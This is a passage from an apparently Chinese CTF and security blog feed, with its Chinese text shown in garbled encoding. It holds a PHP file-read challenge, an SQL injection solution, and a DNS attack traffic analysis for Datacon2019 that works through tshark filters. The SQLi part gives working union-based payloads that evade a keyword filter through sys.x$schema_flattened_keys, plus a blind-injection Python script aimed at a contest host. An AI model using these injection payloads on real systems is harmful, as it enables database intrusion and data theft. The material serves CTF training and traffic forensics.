<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;t&#x27;</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you miss some parameters&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $timestamp = time();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(abs($_GET[<span class="string">&#x27;t&#x27;</span>] - $timestamp) &gt; <span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;what&#x27;s your time?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $file = base64_decode($_GET[<span class="string">&#x27;f&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/../&quot;</span>)) === <span class="string">&quot;/../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;../&quot;</span>)) === <span class="string">&quot;../&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;./&quot;</span>)) === <span class="string">&quot;./&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;/.&quot;</span>)) === <span class="string">&quot;/.&quot;</span> || substr($file, <span class="number">0</span>, strlen(<span class="string">&quot;//&quot;</span>)) === <span class="string">&quot;//&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You are not allowed to do that.&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&#x27;/var/www/html/img/&#x27;</span>.$file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="SQLi">SQLi</h2>
<h3 id="è€ƒç‚¹-v2">è€ƒç‚¹</h3>
<ul>
<li>bypass information_schema</li>
</ul>
<h3 id="è§£é¢˜-v2">è§£é¢˜</h3>
<p>å¤ªèœäº†ã€‚ã€‚ç¬¬äºŒé¢˜å°±ä¸ä¼šäº†ã€‚</p>
<p>èµ›åçœ‹y1ngå¸ˆå‚…çš„writeupï¼š<a href="https://www.gem-love.com/ctf/2514.html">https://www.gem-love.com/ctf/2514.html</a></p>
<p>è¿‡æ»¤äº†å…³é”®å­—</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">return preg_match(&quot;&#x2F;;|benchmark|\^|if|[\s]|in|case|when|sleep|auto|desc|stat|\||lock|or|and|&amp;|like|-|&#96;&#x2F;i&quot;, $id);</span><br></pre></td></tr></table></figure>
<p>ç”¨<code>sys.x$schema_flattened_keys</code>æ¥ç»•è¿‡<code>information_schema</code></p>
<p>æœ‰å›æ˜¾ç›´æ¥è”åˆæ³¨å…¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100%27&#x2F;**&#x2F;union&#x2F;**&#x2F;SELECT&#x2F;**&#x2F;group_concat(table_name),2,3&#x2F;**&#x2F;FROM&#x2F;**&#x2F;&#x2F;**&#x2F;sys.x$schema_flattened_keys&#x2F;**&#x2F;WHERE&#x2F;**&#x2F;table_schema&#x3D;&#39;sqlidb&#39;&#x2F;**&#x2F;GROUP&#x2F;**&#x2F;BY&#x2F;**&#x2F;table_name&#x2F;**&#x2F;limit&#x2F;**&#x2F;0,1%23</span><br></pre></td></tr></table></figure>
<p>å¦å¤–ä¹Ÿå¯ä»¥ç›²æ³¨ï¼ŒæŠŠè¡¨åç»™æ³¨å‡ºæ¥</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests <span class="keyword">as</span> req</span><br><span class="line"><span class="keyword">import</span> time <span class="keyword">as</span> t</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">alpa = string.ascii_letters + string.digits</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#åº“å åˆ©ç”¨limitæ³¨å…¥ sqlidb</span></span><br><span class="line"><span class="comment"># http://183.129.189.60:10004/?id=1%27limit/**/1,1/**/PROCEDURE/**/ANALYSE(1)%23</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#è¡¨å flllaaaggg</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;SELECT group_concat(table_name) FROM  sys.x$schema_flattened_keys WHERE table_schema=&#x27;sqlidb&#x27; GROUP BY table_name limit 0,1&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">	<span class="keyword">for</span> char <span class="keyword">in</span> alpa:</span><br><span class="line">		host = <span class="string">&#x27;&#x27;&#x27;http://183.129.189.60:10004/?id=1&#x27;=(substr((&#123;payload&#125;),&#123;i&#125;,1)=&#x27;&#123;char&#125;&#x27;)%23&#x27;&#x27;&#x27;</span>.format(payload=payload.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;/**/&#x27;</span>), i=i, char=char)</span><br><span class="line"></span><br><span class="line">		r = req.get(host)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">r&#x27;admin666&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">			res += char</span><br><span class="line">			print(<span class="string">&quot;found it: &quot;</span>+res)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		t.sleep(<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure>
<p>å†ç”¨è”åˆæŸ¥è¯¢è·å¾—flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">100&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;*,1&#x2F;**&#x2F;from&#x2F;**&#x2F;flllaaaggg%23</span><br></pre></td></tr></table></figure>
<h2 id="Homebrew-Dubbo-v2">Homebrew Dubbo v2</h2>
<p>å¾…å¡«å‘ã€‚ã€‚ã€‚</p>
<blockquote>
<p>ç­‰ä¸€æ‰‹ä¸‹ä¸ªæ˜ŸæœŸæ‰¾è€æ¿çš„ç›´æ’­è®²è§£ã€‚</p>
</blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v2</title>
    <url>/Web_security/ctf_writeup/2.Datacon2019-q1-Writeup-v2/</url>
    <content><![CDATA[<h1 id="Datacon2019-q1-Writeup-v2">Datacon2019-q1-Writeup-v2</h1>
<p>è¿™ä¸€è½®æµé‡åˆ†æä¸»è¦æ˜¯<strong>åˆ†æ</strong>ä¸ºä¸»ï¼Œä»¥<a href="https://github.com/shyoshyo/DataCon-9102-DNS">è¿™ç¯‡Writeup</a>ä¸ºå‚è€ƒï¼Œæœ‰å…³DNSçš„æ”»å‡»ç±»å‹ã€æ”»å‡»æ‰‹æ®µå’Œæ”»å‡»ç‰¹å¾ï¼Œè¯¦è§[DNSæ”»å‡»æµé‡åˆ†æè¯†åˆ«-v1</p>
<h2 id="ç³»ç»Ÿç¯å¢ƒ">ç³»ç»Ÿç¯å¢ƒ</h2>
<ul>
<li>Windows10 64bitï¼›</li>
<li>wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ï¼›</li>
<li>TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)ï¼›</li>
<li>Cmder 18026 previewï¼›</li>
<li>python 3.7ï¼›</li>
<li>Excel 2016</li>
</ul>
<h2 id="æœªæˆæƒçš„Dynamic-Update">æœªæˆæƒçš„Dynamic Update</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**ç²—ç•¥è§‚å¯Ÿç»å¤§éƒ¨åˆ†DNSåŒ…çš„Opcodeéƒ½æ˜¯0ï¼ˆStandard Queryï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ†æOpcodeä¸ä¸ºé›¶çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç­›é€‰ï¼š</p>
<p><code>dns and not dns.flags.opcode==0</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g548iwinf2j210t0ezgnr.jpg" alt="Figure1ï¼šæœªæˆæƒçš„Dynamic Update"></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå…¨éƒ¨éƒ½æ˜¯DNS Dynamic Updateè¯·æ±‚ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨åœ¨Cmderä¸­ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰å‡ºæ‰€æœ‰çš„æ”»å‡»IPï¼š</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g54e5ws2vfj20bt0dddg2.jpg" alt=""></p>
<p>ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ”»å‡»æ¥æºï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535ã€‚<strong>ç”±äºæ­£å¸¸çš„Dynamic Update ä¸ä¼šå‘é€è¿™ä¹ˆå¤šä¸”è¿™ä¹ˆé¢‘ç¹çš„è¯·æ±‚ï¼Œè€Œä¸”æ¶‰åŠåˆ°äºŒçº§åŸŸåcom.cnä»¥åŠå¾ˆå¤šå…¶ä»–ä¸åŒåŸŸåçš„æ›´æ–°</strong>ï¼Œå› æ­¤æˆ‘ä»¬è®¤ä¸ºè¿™äº›éƒ½æ˜¯æ”»å‡»ã€‚å†ä½¿ç”¨ä¸‹é¢ä¸€è¡Œå‘½ä»¤æŠŠä»–ä»¬é€‰å‡ºæ¥ï¼š</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(5) è¾“å‡ºåˆ°äº†DynamicDNS.csv</p>
<h2 id="åå°„æ”¾å¤§æ”»å‡»">åå°„æ”¾å¤§æ”»å‡»</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹çœ‹é™¤äº†A(1) å’ŒAAAA(28) è¿™ä¸¤ä¸ªå¸¸è§ç±»å‹ä»¥å¤–çš„DNS è¯·æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨<br>
wiresharkï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot;</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hio4fw8j210p0ghq5h.jpg" alt="é™¤äº†A(1) å’ŒAAAA(28) ç±»å‹ä»¥å¤–çš„DNS è¯·æ±‚"></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ‚ä¸ƒæ‚å…«çš„DNS è¯·æ±‚ã€‚ä¸ºä¾¿äºè§‚å¯Ÿï¼Œæˆ‘ä»¬æŒ‰ç…§è¯·æ±‚ç±»å‹æ’åºã€‚ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå‘ç°ä¸€äº›æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå°„æ”¾å¤§æ”»å‡»ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55itxa9hqj210r0h1whb.jpg" alt="åå°„æ”¾å¤§æ”»å‡»"></p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç»Ÿè®¡å„IPçš„è¿›/å‡ºæµé‡ï¼š</p>
<p><code>tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv</code></p>
<p>ä¸ºäº†æ›´å®¹æ˜“è§‚å¯Ÿè¿™äº›IPçš„æµé‡ç‰¹å¾ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„matplotlibæ¨¡å—ä½œå›¾ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">send = []</span><br><span class="line">rece = []</span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;send_rece.csv&#x27;</span> ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">	plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">0</span>] == <span class="string">&#x27;45.80.170.1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">		send.append(int(row[<span class="number">1</span>]))</span><br><span class="line">		rece.append(int(row[<span class="number">2</span>]))</span><br><span class="line">		ip.append(row[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.scatter(send, rece, label=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, txt <span class="keyword">in</span> enumerate(ip):</span><br><span class="line">	<span class="keyword">if</span> send[i] &gt; <span class="number">8e6</span> <span class="keyword">or</span> rece[i] &gt; <span class="number">8e6</span>:</span><br><span class="line">		ax.annotate(txt, (send[i], rece[i]))</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;receive&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦æ’é™¤45.80.170.1ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;æŸ¥çœ‹ç›¸å…³æµé‡ï¼š</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g4rlk5wk9bj211k09iaci.jpg" alt=""></p>
<p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªIPæ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚</p>
</blockquote>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56axqdpwaj211y0in3zd.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°åˆ°188.141.167.218ã€70.85.232.160ã€187.199.129.12 æ˜¯åå°„ç”¨çš„é€’å½’DNSï¼Œè€Œä¼ªé€ å‡ºçš„æºåœ°å€127,130.104.152ã€175.222.102.169ã€105.191.150.205 åˆ™éƒ½æ˜¯å—å®³è€…ã€‚</p>
<blockquote>
<p>ä»å›¾ä¸­ï¼Œ102.181.153.79ä¹Ÿæ¯”è¾ƒå¯ä»¥ï¼Œä½†æ˜¯ä½¿ç”¨<code>ip.addr==102.181.153.79</code>å¯ä»¥çœ‹å‡ºå®ƒçš„è¯·æ±‚ç±»å‹ä¸»è¦æ˜¯MXã€NSå’ŒCNAMEã€‚</p>
</blockquote>
<p><code>tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(3) è¾“å‡ºåˆ°äº†Reflect.csvã€‚</p>
<h2 id="æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡»">æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡»</h2>
<p>ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æœªæˆæƒçš„DNS åŸŸä¼ é€æ”»å‡»ã€‚</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hmu5dvfj20w90gi0vb.jpg" alt="DNSåŸŸä¼ é€æ”»å‡»"></p>
<p>æˆ‘ä»¬ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨<code>dns.qry.type in &#123;252 251&#125;</code>æŠŠAXFR å’ŒIXFR è¿‡æ»¤å‡ºæ¥ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g55hpxssx8j20wl0gidi8.jpg" alt="è¿‡æ»¤åçš„DNS åŸŸä¼ é€æ”»å‡»"></p>
<p>å¯ä»¥æ‰‹å·¥éªŒè¯ï¼Œæœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚æˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œè€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæˆ‘ä»¬è®¤ä¸ºæ˜¯æ”»å‡»çš„åŒ…ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(4) è¾“å‡ºåˆ°äº†AXFR.csvã€‚</p>
<h2 id="DNSSec-NSec-åŸŸåéå†">DNSSec NSec åŸŸåéå†</h2>
<p>ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°DNSSec åŸŸåéå†æ”»å‡»ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56bib7p9gj210q0ghdij.jpg" alt="DNSSecåŸŸåéå†æ”»å‡»"></p>
<p>ç”±äºåŸŸåéå†æ”»å‡»ä¾èµ–äºNSecï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°æ‰§è¡Œ</p>
<p><code>tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot;</code></p>
<p>ä»åŸæ¥çš„æ‰€æœ‰åŒ…ä¸­é‡æ–°è¿‡æ»¤æ‰€æœ‰æ¶‰åŠåˆ°NSec(47) é¡¹çš„å“åº”æ•°æ®åŒ…ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56cbvlgpdj210s0g0n05.jpg" alt=""></p>
<p>å®¹æ˜“æ‰‹å·¥éªŒè¯ï¼Œåœ¨æ‰€æœ‰çš„åŸŸåéå†æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åªæœ‰6.116.183.244 ä¸€ä¸ªäººã€‚æˆ‘ä»¬å¯ä»¥ç”¨ï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot;</code></p>
<p>è¿‡æ»¤å‡º6.116.183.244 å‘é€çš„æ‰€æœ‰åŒ…ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56d4z9fy7j210u0fzjue.jpg" alt=""></p>
<p>å¯è§æ‰€æœ‰çš„æ”»å‡»åŒ…éƒ½æ˜¯SOA æˆ–è€…DS ç±»å‹çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæ”»å‡»çš„åŒ…</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv</code></p>
<h2 id="Doså­åŸŸåéå†æ”»å‡»">Doså­åŸŸåéå†æ”»å‡»</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬å¯ä»¥å…ˆç»Ÿè®¡ä¸€ä¸‹DNS æŸ¥è¯¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åŸŸåçš„æ¬¡æ•°åŠå…¶è¯·æ±‚å‘èµ·äººçš„IPï¼Œå…·ä½“è€Œè¨€å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv</code></p>
<blockquote>
<p>``substr(string, start<code> [</code>, length<code> ])</code>ï¼šReturn a length-character-long substring of string, starting at character number start. The first character of a string is character number one.</p>
<p>`index(str1, str2)ï¼š This searches the string <em>str1</em> for the first occurrences of the string <em>str2</em>, and returns the position in characters where that occurrence begins in the string <em>str1</em></p>
</blockquote>
<p>ä»¥åŸŸåä¸ºæ’åºæ ‡å‡†ï¼ŒæŸ¥çœ‹No_such_name.csvï¼š</p>
<p><code>cat No_such_name.csv | sort -k2nr | less</code></p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200gy1g56f5ke98sj20rl0ef3z9.jpg" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ144.202.64.226æŸ¥è¯¢äº†30318æ¬¡*b0e.com.cnä¸‹é¢ä¸å­˜åœ¨çš„åŸŸåï¼Œæ˜¯æ‰€æœ‰IPä¸­æ¬¡æ•°æœ€å¤šçš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot;</code></p>
<p>è¿›ä¸€æ­¥æŸ¥çœ‹144.202.64.226ç›¸å…³çš„åŒ…ï¼š</p>
<p><img src="http://ww1.sinaimg.cn/large/6e4e7200ly1g576j59tyhj210s0efmzi.jpg" alt=""></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ”»å‡»äºº144.202.64.226 é€‰äº†182.254.116.116 ã€119.29.29.29 å’Œ223.6.6.6 ä¸‰ä¸ªé€’å½’DNS æœåŠ¡å™¨ä½œä¸ºä¸­é—´â€œè·³æ¿â€ï¼Œ<a href="http://xn--b0e-5d2e139f.com.cn">æ”»å‡»b0e.com.cn</a> çš„æƒå¨DNS æœåŠ¡å™¨ã€‚æœ¬æ¥æ”»å‡»è€…è¿˜æƒ³åˆ©ç”¨223.5.5.5 ä½œä¸ºâ€œè·³æ¿â€çš„ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¿™å°DNS æœåŠ¡å™¨æ²¡æœ‰å·¥ä½œï¼Œæ— æ³•åˆ©ç”¨ã€‚</p>
<p>å¯¹äºæ¯ä¸ªå­åŸŸåï¼Œæ”»å‡»äººéƒ½è®¿é—®äº†ä¸¤æ¬¡ã€‚ç¬¬äºŒæ¬¡æ˜æ˜¾å¿«äºç¬¬ä¸€æ¬¡ï¼Œè¯´æ˜è¯·æ±‚ç¡®å®åˆ°è¾¾äº†æƒå¨DNSæœåŠ¡å™¨å¹¶è¢«é€’å½’æœåŠ¡å™¨ç¼“å­˜ã€‚</p>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥æå–å‡ºæ”»å‡»çš„åŒ…ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv</code></p>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–â€œè·³æ¿æœºå™¨â€çš„dnsåŠå…¶è¢«åˆ©ç”¨æ¬¡æ•°ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125;</code></p>
<blockquote>
<p>119.29.29.29 15719<br>
182.254.116.116 16227<br>
223.6.6.6 2247<br>
223.5.5.5 1</p>
</blockquote>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–è¯¢é—®æ¬¡æ•°ä¸æ˜¯ä¸¤æ¬¡çš„åŸŸåï¼š</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;domain[$3] += 1&#125; END &#123;for(i in domain) if(domain[i] != 2) print i, domain[i]&#125;' &gt; query_one_time_domain.csv</code></p>
<p>æˆ‘ä»¬å‘ç°ï¼šè¿™äº›åŸŸåè¦ä¹ˆæ˜¯Google çš„8.8.8.8ï¼Œè®¿é—®äº†å››æ¬¡ï¼Œç”¨äºè¯•æ¢å››ä¸ªâ€œè·³æ¿â€DNS é€’å½’æœåŠ¡å™¨æ˜¯å¦å·¥ä½œï¼›è¦ä¹ˆæ˜¯æ²¡æœ‰æ”¶åˆ°å“åº”çš„è¯·æ±‚ï¼Œå› æ­¤åªè®¿é—®äº†ä¸€æ¬¡ã€‚è¿™é—´æ¥çš„è¯´æ˜äº†å—å®³è€…çš„èµ„æºå·²ç»è¢«æ¶ˆè€—äº†éå¸¸å¤šï¼Œ<a href="http://xn--b0e-xi9dxh38pw5uwor.com.cn">æ”»å‡»äººå¯¹äºb0e.com.cn</a> æƒå¨æœåŠ¡å™¨çš„DoS æ”»å‡»æ˜¯æˆåŠŸçš„ã€‚</p>
<h2 id="åˆ†ææ€è·¯æ€»ç»“">åˆ†ææ€è·¯æ€»ç»“</h2>
<ul>
<li>é¦–å…ˆæŸ¥çœ‹Opcodeä¸ä¸º0ï¼Œå³éStandard Queryçš„æŸ¥è¯¢æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.flags.opcode</code>
<ul>
<li><code>dns.flags.opcode != 0(Standard query)</code>
<ul>
<li><code>dns.flags.opcode == 5(Dynamic Update) </code>â€”&gt; æœªæˆæƒçš„DNS Dynamic Update</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>å†æŸ¥çœ‹ç±»å‹ä¸ä¸ºA(1)å’ŒAAAA(28)ï¼Œå³IPV4å’ŒIPV6çš„æŸ¥è¯¢æ•°æ®åŒ…
<ul>
<li>ç‰¹å¾å­—æ®µï¼š<code>dns.qry.type</code>
<ul>
<li><code>dns.qry.type != 1(A) and 28(AAAA)</code>
<ul>
<li>``dns.qry.type == 255(* ALL)` â€”&gt; åå°„æ”¾å¤§æ”»å‡»</li>
<li><code>dns.qry.type == 252(AXFR)</code> â€”&gt; æœªæˆæƒçš„DNSåŸŸä¼ è¾“æ”»å‡»</li>
<li><code>dns.qry.type == 43(DS) and 6(SOA)</code> â€”&gt; DNSSec åŸŸåéå†æ”»å‡»</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
